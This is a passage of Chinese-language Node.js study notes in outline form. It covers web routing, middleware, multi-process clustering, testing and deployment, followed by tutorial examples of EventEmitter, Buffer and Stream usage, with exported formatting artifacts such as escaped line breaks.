限制上传内容的大小\r\n\t\t- 通过流式解析,将数据流导向到磁盘中，Node只保留文件路径等小数据\r\n\r\n\t- CSRF\r\n\r\n### 路由解析\r\n\r\n- 文件路径型\r\n\r\n\t- 静态文件\r\n\t- 动态文件\r\n\r\n- MVC\r\n\r\n\t- 控制器(Controller),一组行为的集合\r\n\t- 模型(Model),数据相关的操作和封装\r\n\t- 视图(View),视图的渲染\r\n\t- 路由解析,根据URL寻找到对应的控制器和行为\r\n\t- 行为调用相关的模型,进行数据操作\r\n\t- 数据操作结束后,调用视图和相关数据进行页面渲染,输出到客户端\r\n\r\n- RESTful\r\n\r\n\t- 请求方法作为逻辑分发的单元\r\n\t- 将服务器端提供的内容实体看作一个资源\r\n\t- 操作行为主要体现在行为上,主要使用的请求方法是POST和GET\r\n\r\n### 中间件\r\n\r\n- 异常处理\r\n\r\n\t- 为next()方法添加err参数,并捕获中间件直接抛出的同步异常\r\n\t- 中间件异步产生的异常需要自己 传递出来\r\n\r\n- 中间件与性能\r\n\r\n\t- 编写高效的中间件\r\n\t- 合理使用路由\r\n\r\n### 页面渲染\r\n\r\n- 内容响应\r\n\r\n\t- MIME\r\n\t- 附件下载\r\n\t- 响应JSON\r\n\t- 响应跳转\r\n\r\n- 视图渲染\r\n\r\n\t- 在动态页面技术中,最终的视图是由 模板和数据共同生成出来的\r\n\r\n- 模板\r\n\r\n\t- 模板语言\r\n\t- 包含模板语言的模板文件\r\n\t- 拥有动态数据的数据对象\r\n\t- 模板引擎\r\n\t- 模板引擎\r\n\r\n\t\t- 模板编译\r\n\r\n\t- with的应用\r\n\r\n\t\t- 模板安全\r\n\r\n\t- 模板逻辑\r\n\t- 集成文件系统\r\n\t- 子模板\r\n\t- 布局视图\r\n\t- 模板性能\r\n\r\n- Bigpipe\r\n\r\n\t- 前端加载技术,它的提出主要是为了解决重数据页面 的加载速度问题\r\n\t- Bigpipe是一个需要前后端配合实现的优化技术\r\n\r\n\t\t- 页面布局框架\r\n\t\t- 持续数据输出\r\n\t\t- 前端渲染\r\n\r\n\t- Bigpipe将网页布局和数据渲染分离\r\n\r\n## 玩转进程\r\n\r\n### 服务模型的变迁\r\n\r\n- 石器时代:同步\r\n\r\n\t- 服务模式是一次只为一个请求服务\r\n\r\n- 青铜时代:复制进程\r\n\r\n\t- 通过进程的复制同时服务更多的请求和用 户\r\n\r\n- 白银时代:多线程\r\n\r\n\t- 让一个线程服务一个请求，并且线程之间可以共享数据\r\n\r\n- 黄金时代:事件驱动\r\n\r\n\t- 为了解决高并发问题,基于事件驱动的服务模型出现了\r\n\r\n### 多进程架构\r\n\r\n- 理想状态下每个 进程各自利用一个CPU,以此实现多核CPU的利用\r\n- 创建子进程\r\n\r\n\t- child_process模块给予Node可以随意创建子进程(child_process)的能力\r\n\r\n- 进程间通信\r\n\r\n\t- 主线程与工作线程之间通过onmessage()和postMessage()进行通信\r\n子进程对象则由send()方法实现主进程向子进程发送数据\r\n\r\n- 句柄传递\r\n\r\n\t- 一种可以用来标识资源的引用,它的内部包含了指向对象的文件描述 符\r\n\r\n### 集群稳定之路\r\n\r\n- 进程事件\r\n\r\n\t- message\r\n\t- error\r\n\t- exit\r\n\t- close\r\n\t- disconnect\r\n\r\n- 自动重启\r\n\r\n\t- 自杀信号\r\n\t- 限量重启\r\n\r\n- 负载均衡\r\n\r\n\t- 操作系统的抢占式策略，闲着的进程对到来的请求进行争抢,谁抢到谁服务\r\n\r\n- 状态共享\r\n\r\n\t- 数据共享：第三方数据存储\r\n\t- 主动通知\r\n\r\n### Cluster 模块\r\n\r\n- Cluster 工作原理\r\n\r\n\t- 事实上cluster模块就是child_process和net模块的组合应用\r\n\r\n- Cluster 事件\r\n\r\n\t- fork\r\n\t- online\r\n\t- listening\r\n\t- disconnect\r\n\t- exit\r\n\t- setup\r\n\r\n## 测试\r\n\r\n### 单元测试\r\n\r\n- 测试代码的原则\r\n\r\n\t- 单一职责\r\n\t- 接口抽象\r\n\t- 层次分离\r\n\r\n- 单元测试介绍\r\n\r\n\t- 断言\r\n\t- 测试框架\r\n\t- 测试代码的文件组织\r\n\t- 测试用例\r\n\t- 测试覆盖率\r\n\t- mock\r\n\t- 私有方法的测试\r\n\r\n- 工程化与自动化\r\n\r\n\t- 工程化\r\n\t- 持续集成\r\n\r\n### 性能测试\r\n\r\n- 基准测试\r\n\r\n\t- 基准测试要统计的就是在多少 时间内执行了多少次某个方法\r\n\r\n- 压力测试\r\n\r\n\t- 会对网络接口进行压力测试以判断网络接口 的性能\r\n\r\n- 基准测试驱动开发\r\n\r\n\t- 写基准测试\r\n\t- 写/改代码\r\n\t- 收集数据\r\n\t- 找出问题\r\n\t- 回到第2步(写/改代码)\r\n\r\n## 产品化\r\n\r\n### 项目工程化\r\n\r\n- 目录结构\r\n\r\n\t- 常见的Web应用都是以MVC为主要框架的,其余部分在这个基础上进行扩展\r\n\r\n- 构建工具\r\n\r\n\t- 合并静态文件、压缩文件大小、打包应用、编译模块\r\n\t- 工具\r\n\r\n\t\t- Makefile\r\n\t\t- Grunt\r\n\r\n- 编码规范\r\n\r\n\t- 为团队统一良好的编码风格,有助于帮助 提升代码的可读性,进而提升可维护性\r\n\t- 文档式的约定\r\n\t- 代码提交时的强制检查\r\n\r\n- 代码审查\r\n\r\n\t- 代码审查需要耗费一定的精力,一些可以自动化完成的工作可以交由工具来自动完成\r\n\r\n### 部署流程\r\n\r\n- 部署环境\r\n\r\n\t- 开发环境\r\n\t- 测试环境\r\n\t- 预发布环境\r\n\t- 线上环境\r\n\r\n- 部署操作\r\n\r\n\t- 停止进程和重启进程\r\n\r\n### 性能\r\n\r\n- 动静分离\r\n\r\n\t- 将图片、脚本、样式表和多媒体等静态文件都引导到专业的静态文件服务器 上,让Node只处理动态请求即可\r\n\r\n- 启用缓存\r\n\r\n\t- 在缓存的帮助下,却能够消减同步I/O 带来的时间浪费\r\n\r\n- 多进程架构\r\n\r\n\t- 充分利用多核CPU, 更是可以建立机制让Node进程更加健壮,以保障Web应用持续服务\r\n\r\n- 读写分离\r\n\r\n\t- 将数据库进行主从设计,这样读数据操作不再受到写入的影响,降低了性能的影响\r\n\r\n### 日志\r\n\r\n- 通过 记录日志来定位问题是一种成本较小的方式\r\n- 访问日志\r\n\r\n\t- 可以置入一些用户信息,用以跟踪一些数据,比如某个登录用户太过密集地访问某个页 面等,\r\n他有可能是一个机器人,在爬取网页中的数据\r\n\r\n- 异常日志\r\n\r\n\t- 异常日志通常用来记录那些意外产生的异常错误\r\n\r\n- 日志与数据库\r\n\r\n\t- ,将日志分析和日志记录这两个步骤分离开来是较好的选择\r\n\r\n- 分割日志\r\n\r\n\t- 线上业务可能访问量巨大,产生的日志也可能是大量的\r\n\r\n### 监控报警\r\n\r\n- 监控\r\n\r\n\t- 为了将一些重要指标采样记录下来,一旦这些指标发生较大变化\r\n可以配 合报警系统将问题反馈到负责人那\r\n\t- 日志监控\r\n\t- 响应时间\r\n\t- 进程监控\r\n\t- 磁盘监控\r\n\t- 内存监控\r\n\t- CPU占用监控\r\n\t- CPU load监控\r\n\t- I/O负载\r\n\t- 网络监控\r\n\t- 应用状态监控\r\n\t- DNS监控\r\n\r\n- 报警的实现\r\n\r\n\t- 邮件报警\r\n\t- 短信或电话报警\r\n\r\n### 稳定性\r\n\r\n- 为了更好的稳定性,典型的水 平扩展方式就是多进程、多机器、多机房、容灾备份\r\n\r\n### 异构共存\r\n\r\n- Node能够通过协议 与已有的系统很好地异构共存\r\n\r\n## 参照\r\n\r\n## nodejs 详细\r\n\r\n### Node.js\r\n\r\n- Node.js 事件循环\r\n\r\n\t- 事件驱动程序\r\n\r\n\t\t- Node.js 使用事件驱动模型，当web server接收到请求，就把它关闭然后进行处理，然后去服务下一个web请求。\r\n\r\n\t\t  当这个请求完成，它被放回处理队列，当到达队列开头，这个结果被返回给用户。\r\n\t\t  \r\n\t\t  这个模型非常高效可扩展性非常强，因为webserver一直接受请求而不等待任何读写操作。（这也被称之为非阻塞式IO或者事件驱动IO）\r\n\t\t  \r\n\t\t  在事件驱动模型中，会生成一个主循环来监听事件，当检测到事件时触发回调函数。\r\n\t\t  \r\n\t\t  \r\n\r\n\t- Node.js 事件\r\n\r\n\t\t- Node.js 所有的异步 I/O 操作在完成时都会发送一个事件到事件队列。\r\n\r\n\t\t  Node.js 里面的许多对象都会分发事件：一个net.Server对象会在每次有新连接时分发一个事件， 一个fs.readStream对象会在文件被打开的时候发出一个事件。 所有这些产生事件的对象都是 events.EventEmitter 的实例。 你可以通过require(\"events\");来访问该模块。\r\n\t\t  \r\n\t\t  下面我们用一个简单的例子说明 EventEmitter 的用法：\r\n\t\t  \r\n\t\t  ``` null\r\n\t\t  - //event.js \r\n\t\t  ```\r\n\t\t  \r\n\t\t  var EventEmitter = require('events').EventEmitter;\r\n\t\t  var event = new EventEmitter();\r\n\t\t  event.on('some_event', function() {\r\n\t\t  console.log('some_event occured.');\r\n\t\t  });\r\n\t\t  setTimeout(function() {\r\n\t\t  event.emit('some_event');\r\n\t\t  }, 1000);\r\n\t\t  \r\n\t\t  \r\n\r\n\t\t- EventEmitter介绍\r\n\r\n\t\t\t- events 模块只提供了一个对象： events.EventEmitter。EventEmitter 的核心就 是事件发射与事件监听器功能的封装。EventEmitter 的每个事件由一个事件名和若干个参 数组成，事件名是一个字符串，通常表达一定的语义。对于每个事件，EventEmitter 支持 若干个事件监听器。\r\n\r\n\t\t\t  当事件发射时，注册到这个事件的事件监听器被依次调用，事件参数作 为回调函数参数传递。\r\n\t\t\t  \r\n\t\t\t  ``` null\r\n\t\t\t  \t- 让我们以下面的例子解释这个过程：\r\n\t\t\t  \r\n\t\t\t  \t\t- var events = require('events'); \r\n\t\t\t  ```\r\n\t\t\t  \r\n\t\t\t  var emitter = new events.EventEmitter();\r\n\t\t\t  emitter.on('someEvent', function(arg1, arg2) {\r\n\t\t\t  console.log('listener1', arg1, arg2);\r\n\t\t\t  });\r\n\t\t\t  emitter.on('someEvent', function(arg1, arg2) {\r\n\t\t\t  console.log('listener2', arg1, arg2);\r\n\t\t\t  });\r\n\t\t\t  emitter.emit('someEvent', 'byvoid', 1991);\r\n\t\t\t  \r\n\t\t\t  \r\n\r\n\t\t- EventEmitter常用的API\r\n\r\n\t\t\t- EventEmitter.on(event, listener)、emitter.addListener(event, listener)为指定事件注册一个监听器，接收一个字符串 event 和一个回调函数 listener。\r\n\r\n\t\t\t\t- server.on('connection', function (stream) {\r\nconsole.log('someone connected!');\r\n});\r\n\r\n\t\t\t- EventEmitter.emit(event, [arg1], [arg2], [...]) 发射 event 事件，传 递若干可选参数到事件监听器的参数表。\r\n\t\t\t- EventEmitter.once(event, listener) 为指定事件注册一个单次监听器，即 监听器最多只会触发一次，触发后立刻解除该监听器。\r\n\r\n\t\t\t\t- server.once('connection', function (stream) {\r\nconsole.log('Ah, we have our first user!');\r\n});\r\n\r\n\t\t\t- EventEmitter.removeListener(event, listener) 移除指定事件的某个监听 器，listener 必须是该事件已经注册过的监听器。\r\n\r\n\t\t\t\t- var callback = function(stream) {\r\nconsole.log('someone connected!');\r\n};\r\nserver.on('connection', callback);\r\n// ...\r\nserver.removeListener('connection', callback);\r\n\r\n\t\t\t- EventEmitter.removeAllListeners([event]) 移除所有事件的所有监听器， 如果指定 event，则移除指定事件的所有监听器。\r\n\r\n\t\t- error 事件\r\n\r\n\t\t\t- EventEmitter 定义了一个特殊的事件 error，它包含了\"错误\"的语义，我们在遇到 异常的时候通常会发射 error 事件。当 error 被发射时，EventEmitter 规定如果没有响 应的监听器，Node.js 会把它当作异常，退出程序并打印调用栈。我们一般要为会发射 error 事件的对象设置监听器，避免遇到错误后整个程序崩溃。例如：\r\n\r\n\t\t\t\t- var events = require('events');\r\nvar emitter = new events.EventEmitter();\r\nemitter.emit('error');\r\n\r\n\t\t- 继承 EventEmitter\r\n\r\n\t\t\t- 大多数时候我们不会直接使用 EventEmitter，而是在对象中继承它。包括 fs、net、 http 在内的，只要是支持事件响应的核心模块都是 EventEmitter 的子类。\r\n\r\n\t\t\t  为什么要这样做呢？原因有两点：\r\n\t\t\t  \r\n\t\t\t  首先，具有某个实体功能的对象实现事件符合语义， 事件的监听和发射应该是一个对象的方法。\r\n\t\t\t  \r\n\t\t\t  其次JavaScript 的对象机制是基于原型的，支持 部分多重继承，继承 EventEmitter 不会打乱对象原有的继承关系。\r\n\t\t\t  \r\n\t\t\t  \r\n\r\n- Node.js Buffer(缓冲区)\r\n\r\n\t- JavaScript 语言自身只有字符串数据类型，没有二进制数据类型。\r\n\r\n\t  但在处理像TCP流或文件流时，必须使用到二进制数据。因此在 Node.js中，定义了一个 Buffer 类，该类用来创建一个专门存放二进制数据的缓存区。\r\n\t  \r\n\t  在 Node.js 中，Buffer 类是随 Node 内核一起发布的核心库。Buffer 库为 Node.js 带来了一种存储原始数据的方法，可以让 Node.js 处理二进制数据，每当需要在 Node.js 中处理I/O操作中移动的数据时，就有可能使用 Buffer 库。原始数据存储在 Buffer 类的实例中。一个 Buffer 类似于一个整数数组，但它对应于 V8 堆内存之外的一块原始内存。\r\n\t  \r\n\t  \r\n\r\n\t- 创建 Buffer 类\r\n\r\n\t\t- 创建长度为 10 字节的 Buffer 实例：\r\nvar buf = new Buffer(10);\r\n\t\t- 通过给定的数组创建 Buffer 实例：\r\nvar buf = new Buffer([10, 20, 30, 40, 50]);\r\n\t\t- 通过一个字符串来创建 Buffer 实例：\r\nvar buf = new Buffer(\"www.w3cschool.cn\", \"utf-8\");\r\n\r\n\t- 写入缓冲区\r\n\r\n\t\t- 写入 Node 缓冲区的语法如下所示：\r\n\r\n\t\t\t- buf.write(string[, offset[, length]][, encoding])\r\n\r\n\t\t\t\t- 参数描述如下：\r\n\r\n\t\t\t\t\t- string - 写入缓冲区的字符串。\r\n\t\t\t\t\t- offset - 缓冲区开始写入的索引值，默认为 0 。\r\n\t\t\t\t\t- length - 写入的字节数，默认为 buffer.length\r\n\t\t\t\t\t- encoding - 使用的编码。默认为 'utf8' 。\r\n\r\n\t\t\t\t- 返回值\r\n\r\n\t\t\t\t\t- 返回实际写入的大小。如果 buffer 空间不足， 则只会写入部分字符串\r\n\r\n\t\t\t\t- 实例\r\n\r\n\t\t\t\t\t- buf = new Buffer(256);\r\nlen = buf.write(\"www.w3cschool.cn\");\r\n\r\n\t\t\t\t\t  console.log(\"写入字节数 : \"+  len);\r\n\t\t\t\t\t  \r\n\t\t\t\t\t  ``` null\r\n\t\t\t\t\t  \t\t\t- 执行以上代码，输出结果为：\r\n\t\t\t\t\t  \r\n\t\t\t\t\t  \t\t\t\t- $node main.js\r\n\t\t\t\t\t  ```\r\n\t\t\t\t\t  \r\n\t\t\t\t\t  写入字节数 : 16\r\n\t\t\t\t\t  \r\n\t\t\t\t\t  \r\n\r\n\t- 从缓冲区读取数据\r\n\r\n\t\t- 写入 Node 缓冲区的语法如下所示：\r\n\r\n\t\t\t- buf.write(string[, offset[, length]][, encoding])\r\n\r\n\t\t\t\t- 参数描述如下：\r\n\r\n\t\t\t\t\t- encoding - 使用的编码。默认为 'utf8' 。\r\n\t\t\t\t\t- start - 指定开始读取的索引位置，默认为 0。\r\n\t\t\t\t\t- end - 结束位置，默认为缓冲区的末尾。\r\n\r\n\t\t\t\t- 返回值\r\n\r\n\t\t\t\t\t- 解码缓冲区数据并使用指定的编码返回字符串。\r\n\r\n\t\t\t\t- 实例\r\n\r\n\t\t\t\t\t- buf = new Buffer(26);\r\nfor (var i = 0 ; i < 26 ; i++) {\r\nbuf[i] = i + 97;\r\n}\r\n\r\n\t\t\t\t\t  console.log( buf.toString('ascii'));       // 输出: abcdefghijklmnopqrstuvwxyz\r\n\t\t\t\t\t  console.log( buf.toString('ascii',0,5));   // 输出: abcde\r\n\t\t\t\t\t  console.log( buf.toString('utf8',0,5));    // 输出: abcde\r\n\t\t\t\t\t  console.log( buf.toString(undefined,0,5)); // 使用 'utf8' 编码, 并输出: abcde\r\n\t\t\t\t\t  \r\n\t\t\t\t\t  ``` null\r\n\t\t\t\t\t  \t\t\t- 执行以上代码，输出结果为：\r\n\t\t\t\t\t  \r\n\t\t\t\t\t  \t\t\t\t- $ node main.js\r\n\t\t\t\t\t  ```\r\n\t\t\t\t\t  \r\n\t\t\t\t\t  abcdefghijklmnopqrstuvwxyz\r\n\t\t\t\t\t  abcde\r\n\t\t\t\t\t  abcde\r\n\t\t\t\t\t  abcde\r\n\t\t\t\t\t  \r\n\t\t\t\t\t  \r\n\r\n\t- 将 Buffer 转换为 JSON 对象\r\n\r\n\t\t- 将 Node Buffer 转换为 JSON 对象的函数语法格式如下：\r\n\r\n\t\t\t- buf.toJSON()\r\n\t\t\t- 返回值\r\n\r\n\t\t\t\t- 返回 JSON 对象。\r\n\r\n\t\t\t- 实例\r\n\r\n\t\t\t\t- var buf = new Buffer('www.w3cschool.cn');\r\nvar json = buf.toJSON(buf);\r\n\r\n\t\t\t\t  console.log(json);\r\n\t\t\t\t  \r\n\t\t\t\t  ``` null\r\n\t\t\t\t  \t\t- 执行以上代码，输出结果为：\r\n\t\t\t\t  \r\n\t\t\t\t  \t\t\t- { type: 'Buffer',\r\n\t\t\t\t  ```\r\n\t\t\t\t  \r\n\t\t\t\t  data: [ 119, 119, 119, 46, 119, 51, 99, 115, 99, 104, 111, 111, 108, 46, 99, 110 ] }\r\n\t\t\t\t  \r\n\t\t\t\t  \r\n\r\n\t- 缓冲区合并\r\n\r\n\t\t- Node 缓冲区合并的语法如下所示：\r\n\r\n\t\t\t- Buffer.concat(list[, totalLength])\r\n\r\n\t\t\t\t- 参数描述如下：\r\n\r\n\t\t\t\t\t- list - 用于合并的 Buffer 对象数组列表。\r\n\t\t\t\t\t- totalLength - 指定合并后Buffer对象的总长度。\r\n\r\n\t\t\t\t- 返回值\r\n\r\n\t\t\t\t\t- 返回一个多个成员合并的新 Buffer 对象。\r\n\r\n\t\t\t\t- 实例\r\n\r\n\t\t\t\t\t- var buffer1 = new Buffer('W3Cschool教程 ');\r\nvar buffer2 = new Buffer('www.w3cschool.cn');\r\nvar buffer3 = Buffer.concat([buffer1,buffer2]);\r\nconsole.log(\"buffer3 内容: \" + buffer3.toString());\r\n\r\n\t\t\t\t\t\t- 执行以上代码，输出结果为：\r\n\r\n\t\t\t\t\t\t\t- buffer3 内容: W3Cschool教程 www.w3cschool.cn\r\n\r\n\t- 缓冲区比较\r\n\r\n\t\t- Node Buffer 比较的函数语法如下所示, 该方法在 Node.js v0.12.2 版本引入：\r\n\r\n\t\t\t- buf.compare(otherBuffer);\r\n\r\n\t\t\t\t- 参数描述如下：\r\n\r\n\t\t\t\t\t- otherBuffer - 与 buf 对象比较的另外一个 Buffer 对象。\r\n\r\n\t\t\t\t- 返回值\r\n\r\n\t\t\t\t\t- 返回一个数字，表示 buf 在 otherBuffer 之前，之后或相同。\r\n\r\n\t\t\t\t- 实例\r\n\r\n\t\t\t\t\t- var buffer1 = new Buffer('ABC');\r\nvar buffer2 = new Buffer('ABCD');\r\nvar result = buffer1.compare(buffer2);\r\n\r\n\t\t\t\t\t  if(result < 0) {\r\n\t\t\t\t\t  console.log(buffer1 + \" 在 \" + buffer2 + \"之前\");\r\n\t\t\t\t\t  }else if(result == 0){\r\n\t\t\t\t\t  console.log(buffer1 + \" 与 \" + buffer2 + \"相同\");\r\n\t\t\t\t\t  }else {\r\n\t\t\t\t\t  console.log(buffer1 + \" 在 \" + buffer2 + \"之后\");\r\n\t\t\t\t\t  }\r\n\t\t\t\t\t  \r\n\t\t\t\t\t  ``` null\r\n\t\t\t\t\t  \t\t\t- 执行以上代码，输出结果为：\r\n\t\t\t\t\t  \r\n\t\t\t\t\t  \t\t\t\t- ABC在ABCD之前\r\n\t\t\t\t\t  ```\r\n\t\t\t\t\t  \r\n\t\t\t\t\t  \r\n\r\n\t- 拷贝缓冲区\r\n\r\n\t\t- Node 缓冲区拷贝语法如下所示：\r\n\r\n\t\t\t- buf.copy(target[, targetStart[, sourceStart[, sourceEnd]]])\r\n\r\n\t\t\t\t- 参数描述如下：\r\n\r\n\t\t\t\t\t- targetBuffer - 要拷贝的 Buffer 对象。\r\n\t\t\t\t\t- targetStart - 数字, 可选, 默认: 0\r\n\t\t\t\t\t- sourceStart - 数字, 可选, 默认: 0\r\n\t\t\t\t\t- sourceEnd - 数字, 可选, 默认: buffer.length\r\n\r\n\t\t\t\t- 返回值\r\n\r\n\t\t\t\t\t- 没有返回值。\r\n\r\n\t\t\t\t- 实例\r\n\r\n\t\t\t\t\t- var buffer1 = new Buffer('ABC');\r\n// 拷贝一个缓冲区\r\nvar buffer2 = new Buffer(3);\r\nbuffer1.copy(buffer2);\r\nconsole.log(\"buffer2 content: \" + buffer2.toString());\r\n\r\n\t\t\t\t\t\t- 执行以上代码，输出结果为：\r\n\r\n\t\t\t\t\t\t\t- buffer2 content: ABC\r\n\r\n\t- 缓冲区裁剪\r\n\r\n\t\t- Node 缓冲区裁剪语法如下所示：\r\n\r\n\t\t\t- buf.slice([start[, end]])\r\n\r\n\t\t\t\t- 参数\r\n\r\n\t\t\t\t\t- start - 数字, 可选, 默认: 0\r\n\t\t\t\t\t- end - 数字, 可选, 默认: buffer.length\r\n\r\n\t\t\t\t- 返回值\r\n\r\n\t\t\t\t\t- 返回一个新的缓冲区，它和旧缓冲区指向同一块内存，但是从索引 start 到 end 的位置剪切。\r\n\r\n\t\t\t\t- 实例\r\n\r\n\t\t\t\t\t- var buffer1 = new Buffer('youj');\r\n// 剪切缓冲区\r\nvar buffer2 = buffer1.slice(0,2);\r\nconsole.log(\"buffer2 content: \" + buffer2.toString());\r\n\r\n\t\t\t\t\t\t- 执行以上代码，输出结果为：\r\n\r\n\t\t\t\t\t\t\t- buffer2 content: yo\r\n\r\n\t- 缓冲区长度\r\n\r\n\t\t- Node 缓冲区长度计算语法如下所示：\r\n\r\n\t\t\t- buf.length;\r\n\r\n\t\t\t\t- 返回值\r\n\r\n\t\t\t\t\t- 返回 Buffer 对象所占据的内存长度。\r\n\r\n\t\t\t\t- 实例\r\n\r\n\t\t\t\t\t- var buffer = new Buffer('www.w3cschool.cn');\r\n//  缓冲区长度\r\nconsole.log(\"buffer length: \" + buffer.length);\r\n\r\n\t\t\t\t\t\t- 执行以上代码，输出结果为：\r\n\r\n\t\t\t\t\t\t\t- buffer length: 16\r\n\r\n- Node.js Stream(流)\r\n\r\n\t- 概述\r\n\r\n\t\t- tream 是 Node.js 中非常重要的一个模块，应用广泛。\r\n\r\n\t\t  Stream 是一个抽象接口，Node 中有很多对象实现了这个接口。例如，对http 服务器发起请求的request 对象就是一个 Stream，还有stdout（标准输出）。\r\n\t\t  \r\n\t\t  该抽象接口是可读、可写或是既可读又可写的，通过这些接口，我们可以和磁盘文件、套接字、HTTP请求来交互，实现数据从一个地方流动到另一个地方的功能。\r\n\t\t  \r\n\t\t  \r\n\r\n\t- 类型\r\n\r\n\t\t- Readable - 可读操作。\r\n\t\t- Writable - 可写操作。\r\n\t\t- Duplex - 可读可写操作.\r\n\t\t- Transform - 操作被写入数据，然后读出结果。\r\n\r\n\t- 事件\r\n\r\n\t\t- data - 当有数据可读时触发。\r\n\t\t- end - 没有更多的数据可读时触发。\r\n\t\t- error - 在接收和写入过程中发生错误时触发。\r\n\t\t- finish - 所有数据已被写入到底层系统时触发。\r\n\r\n\t- Node.js Stream(流)\r\n\r\n\t\t- 从流中读取数据\r\n\r\n\t\t\t- 创建 input.txt 文件，内容如下：\r\n\r\n\t\t\t\t- W3Cschool教程官网地址：www.w3cschool.cn\r\n\r\n\t\t\t- 创建 main.js 文件, 代码如下：\r\n\r\n\t\t\t\t- var fs = require(\"fs\");\r\nvar data = '';\r\n\r\n\t\t\t\t  // 创建可读流\r\n\t\t\t\t  var readerStream = fs.createReadStream('input.txt');\r\n\t\t\t\t  \r\n\t\t\t\t  // 设置编码为 utf8。\r\n\t\t\t\t  readerStream.setEncoding('UTF8');\r\n\t\t\t\t  \r\n\t\t\t\t  // 处理流事件 --\x3e data, end, and error\r\n\t\t\t\t  readerStream.on('data', function(chunk) {\r\n\t\t\t\t  data += chunk;\r\n\t\t\t\t  });\r\n\t\t\t\t  \r\n\t\t\t\t  readerStream.on('end',function(){\r\n\t\t\t\t  console.log(data);\r\n\t\t\t\t  });\r\n\t\t\t\t  \r\n\t\t\t\t  readerStream.on('error', function(err){\r\n\t\t\t\t  console.log(err.stack);\r\n\t\t\t\t  });\r\n\t\t\t\t  \r\n\t\t\t\t  console.log(\"程序执行完毕\");\r\n\t\t\t\t  \r\n\t\t\t\t  ``` null\r\n\t\t\t\t  - 以上代码执行结果如下：\r\n\t\t\t\t  \r\n\t\t\t\t  \t- 程序执行完毕\r\n\t\t\t\t  ```\r\n\t\t\t\t  \r\n\t\t\t\t  W3Cschool教程官网地址：www.w3cschool.cn\r\n\t\t\t\t  \r\n\t\t\t\t  \r\n\r\n\t\t- 写入流\r\n\r\n\t\t\t- 创建 main.js 文件, 代码如下：\r\n\r\n\t\t\t\t- var fs = require(\"fs\");\r\nvar data = 'W3Cschool教程官网地址：www.w3cschool.cn';\r\n\r\n\t\t\t\t  // 创建一个可以写入的流，写入到文件 output.txt 中\r\n\t\t\t\t  var writerStream = fs.createWriteStream('output.txt');\r\n\t\t\t\t  \r\n\t\t\t\t  // 使用 utf8 编码写入数据\r\n\t\t\t\t  writerStream.write(data,'UTF8');\r\n\t\t\t\t  \r\n\t\t\t\t  // 标记文件末尾\r\n\t\t\t\t  writerStream.end();\r\n\t\t\t\t  \r\n\t\t\t\t  // 处理流事件 --\x3e data, end, and error\r\n\t\t\t\t  writerStream.on('finish', function() {\r\n\t\t\t\t  console.log(\"写入完成。\");\r\n\t\t\t\t  });\r\n\t\t\t\t  \r\n\t\t\t\t  writerStream.on('error', function(err){\r\n\t\t\t\t  console.log(err.stack);\r\n\t\t\t\t  });\r\n\t\t\t\t  \r\n\t\t\t\t  console.log(\"程序执行完毕\");\r\n\t\t\t\t  \r\n\t\t\t\t  ``` null\r\n\t\t\t\t  - 以上程序会将 data 变量的数据写入到 output.txt 文件中。代码执行结果如下：\r\n\t\t\t\t  \r\n\t\t\t\t  \t- $ node main.js \r\n\t\t\t\t  ```\r\n\t\t\t\t  \r\n\t\t\t\t  程序执行完毕\r\n\t\t\t\t  写入完成。\r\n\t\t\t\t  \r\n\t\t\t\t  ``` null\r\n\t\t\t\t  - 查看 output.txt 文件的内容：\r\n\t\t\t\t  \r\n\t\t\t\t  \t- $ cat output.txt \r\n\t\t\t\t  ```\r\n\t\t\t\t  \r\n\t\t\t\t  W3Cschool教程官网地址：www.w3cschool.cn\r\n\t\t\t\t  \r\n\t\t\t\t  \r\n\r\n\t\t- 管道流\r\n\r\n\t\t\t- 管道提供了一个输出流到输入流的机制。通常我们用于从一个流中获取数据并将数据传递到另外一个流中。\r\n\t\t\t- 以下实例我们通过读取一个文件内容并将内容写入到另外一个文件中。\r\n\r\n\t\t\t\t- 设置 input.txt 文件内容如下：\r\n\r\n\t\t\t\t\t- W3Cschool教程官网地址：www.w3cschool.cn\r\n管道流操作实例\r\n\r\n\t\t\t\t- 创建 main.js 文件, 代码如下：\r\n\r\n\t\t\t\t\t- var fs = require(\"fs\");\r\n\r\n\t\t\t\t\t  // 创建一个可读流\r\n\t\t\t\t\t  var readerStream = fs.createReadStream('input.txt');\r\n\t\t\t\t\t  \r\n\t\t\t\t\t  // 创建一个可写流\r\n\t\t\t\t\t  var writerStream = fs.createWriteStream('output.txt');\r\n\t\t\t\t\t  \r\n\t\t\t\t\t  // 管道读写操作\r\n\t\t\t\t\t  // 读取 input.txt 文件内容，并将内容写入到 output.txt 文件中\r\n\t\t\t\t\t  readerStream.pipe(writerStream);\r\n\t\t\t\t\t  \r\n\t\t\t\t\t  console.log(\"程序执行完毕\");\r\n\t\t\t\t\t  \r\n\t\t\t\t\t  ``` null\r\n\t\t\t\t\t  \t- 代码执行结果如下：\r\n\t\t\t\t\t  \r\n\t\t\t\t\t  \t\t- $ node main.js \r\n\t\t\t\t\t  ```\r\n\t\t\t\t\t  \r\n\t\t\t\t\t  程序执行完毕\r\n\t\t\t\t\t  \r\n\t\t\t\t\t  ``` null\r\n\t\t\t\t\t  \t- 查看 output.txt 文件的内容：\r\n\t\t\t\t\t  \r\n\t\t\t\t\t  \t\t- $ cat output.txt \r\n\t\t\t\t\t  ```\r\n\t\t\t\t\t  \r\n\t\t\t\t\t  W3Cschool教程官网地址：www.w3cschool.cn\r\n\t\t\t\t\t  管道流操作实例\r\n\t\t\t\t\t  \r\n\t\t\t\t\t  \r\n\r\n\t\t- 链式流\r\n\r\n\t\t\t- 链式是通过连接输出流到另外一个流并创建多个对个流操作链的机制。链式流一般用于管道操作。\r\n\r\n\t\t\t  接下来我们就是用管道和链式来压缩和解压文件。\r\n\t\t\t  - 创建 compress.js 文件, 代码如下：\r\n\t\t\t  \r\n\t\t\t  ``` null\r\n\t\t\t  \t- var fs = require(\"fs\");\r\n\t\t\t  ```\r\n\t\t\t  \r\n\t\t\t  var zlib = require('zlib');\r\n\t\t\t  \r\n\t\t\t  // 压缩 input.txt 文件为 input.txt.gz\r\n\t\t\t  fs.createReadStream('input.txt')\r\n\t\t\t  .pipe(zlib.createGzip())\r\n\t\t\t  .pipe(fs.createWriteStream('input.txt.gz'));\r\n\t\t\t  \r\n\t\t\t  console.log(\"文件压缩完成。\");\r\n\t\t\t  \r\n\t\t\t  ``` null\r\n\t\t\t  - 代码执行结果如下：\r\n\t\t\t  \r\n\t\t\t  \t- $ node compress.js \r\n\t\t\t  ```\r\n\t\t\t  \r\n\t\t\t  文件压缩完成。\r\n\t\t\t  \r\n\t\t\t  ``` null\r\n\t\t\t  - 